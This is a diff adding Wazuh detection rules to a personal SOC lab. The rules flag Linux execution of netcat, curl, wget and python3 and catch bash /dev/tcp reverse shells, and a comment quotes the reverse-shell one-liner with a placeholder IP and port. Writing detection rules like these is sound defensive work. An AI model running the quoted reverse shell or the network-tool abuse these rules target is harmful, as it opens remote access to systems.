@@ -1,0 +1,99 @@
+<!-- ============================================================
+     CUSTOM DETECTION RULES — Project 5 Additions
+     Author: Ahmed Salam
+     Azure Sentinel SOC Lab
+     Last Updated: September 2026
+     Total Rules in This File: 5 (100021-100025)
+
+     These rules extend the Wazuh instance shared with home-soc-lab
+     (rules 100001-100010) to add Linux process-level detection —
+     see the main repo's README for why this extension happened.
+     Rules 100011-100020 belong to other companion projects
+     (Threat Intel Integration, AI-Augmented Alert Triage) and are
+     not duplicated here.
+     ============================================================ -->
+<group name="custom_detections,linux,lolbin,">
+
+  <!-- ============================================================
+       RULE 100021  Linux LOLBIN - netcat/nc Execution
+       MITRE ATT&CK: T1105/T1219 - Ingress Tool Transfer / Remote Access
+       Detection: nc or netcat binary executed (auditd)
+       Severity: High (level 12)
+       ============================================================ -->
+  <rule id="100021" level="12">
+    <if_group>audit</if_group>
+    <field name="audit.command" type="pcre2">^nc(\.openbsd)?$|^netcat$</field>
+    <description>Linux LOLBIN: netcat/nc executed - possible reverse shell or data exfiltration (T1105/T1219)</description>
+    <mitre>
+      <id>T1105</id>
+      <id>T1219</id>
+    </mitre>
+    <group>attack,lolbin,linux,netcat,</group>
+  </rule>
+
+  <!-- ============================================================
+       RULE 100022  Linux LOLBIN - curl Execution
+       MITRE ATT&CK: T1105 - Ingress Tool Transfer
+       Detection: curl binary executed (auditd)
+       Severity: Medium (level 10)
+       ============================================================ -->
+  <rule id="100022" level="10">
+    <if_group>audit</if_group>
+    <field name="audit.command" type="pcre2">^curl$</field>
+    <description>Linux LOLBIN: curl executed - possible payload download (T1105)</description>
+    <mitre>
+      <id>T1105</id>
+    </mitre>
+    <group>attack,lolbin,linux,curl,</group>
+  </rule>
+
+  <!-- ============================================================
+       RULE 100023  Linux LOLBIN - wget Execution
+       MITRE ATT&CK: T1105 - Ingress Tool Transfer
+       Detection: wget binary executed (auditd)
+       Severity: Medium (level 10)
+       ============================================================ -->
+  <rule id="100023" level="10">
+    <if_group>audit</if_group>
+    <field name="audit.command" type="pcre2">^wget$</field>
+    <description>Linux LOLBIN: wget executed - possible payload download (T1105)</description>
+    <mitre>
+      <id>T1105</id>
+    </mitre>
+    <group>attack,lolbin,linux,wget,</group>
+  </rule>
+
+  <!-- ============================================================
+       RULE 100024  Linux LOLBIN - Python3 Execution
+       MITRE ATT&CK: T1059.006 - Python
+       Detection: python3 binary executed (auditd)
+       Severity: High (level 12)
+       ============================================================ -->
+  <rule id="100024" level="12">
+    <if_group>audit</if_group>
+    <field name="audit.command" type="pcre2">^python3$</field>
+    <description>Linux LOLBIN: python3 executed - possible malicious scripting activity (T1059.006)</description>
+    <mitre>
+      <id>T1059.006</id>
+    </mitre>
+    <group>attack,lolbin,linux,python,</group>
+  </rule>
+
+  <!-- ============================================================
+       RULE 100025  Linux Reverse Shell - Bash /dev/tcp Pattern
+       MITRE ATT&CK: T1059.004 - Unix Shell
+       Detection: bash invoked referencing /dev/tcp (classic reverse
+       shell one-liner pattern, e.g. bash -i >& /dev/tcp/IP/PORT 0>&1)
+       Severity: Critical (level 14)
+       ============================================================ -->
+  <rule id="100025" level="14">
+    <if_group>audit</if_group>
+    <match type="pcre2">(?i)/dev/tcp/|2F6465762F7463702F</match>
+    <description>Linux reverse shell: bash /dev/tcp pattern detected - high-confidence malicious activity (T1059.004)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>attack,lolbin,linux,reverse_shell,critical,</group>
+  </rule>
+
+</group>
